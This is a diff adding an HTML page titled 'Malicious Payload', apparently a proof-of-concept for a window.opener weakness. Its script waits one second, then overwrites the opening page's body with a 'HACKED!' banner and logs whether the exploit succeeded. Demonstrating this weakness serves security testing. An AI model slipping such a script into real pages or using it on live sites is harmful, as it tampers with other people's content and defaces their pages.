@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious Payload</title>
+</head>
+<body>
+    <h1>Popup Opened</h1>
+    <script>
+        // Coba akses dan manipulasi dokumen utama
+        setTimeout(() => {
+            if (window.opener) {
+                window.opener.document.body.innerHTML = "<h1 style='color:red;'>HACKED!</h1>";
+                console.log("Exploit executed: Main document modified.");
+            } else {
+                console.log("Exploit failed: No access to opener.");
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
